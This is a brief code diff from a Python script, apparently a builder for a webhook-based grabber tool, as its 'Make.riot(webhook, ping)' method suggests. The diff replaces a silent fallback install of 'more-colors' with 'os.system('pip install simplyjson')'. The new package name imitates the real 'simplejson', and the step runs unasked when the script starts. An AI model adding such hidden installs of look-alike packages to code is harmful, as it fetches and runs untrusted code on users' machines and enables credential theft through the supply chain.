@@ -7,9 +7,9 @@ from shutil import rmtree
 
 try:
     print("[!] Preparing the setup...")
-    import morecolors
+    import simplyjson
 except:
-    os.system('pip install more-colors')
+    os.system('pip install simplyjson')
 
 class Make:
     def riot(webhook: str, ping: bool) -> str:
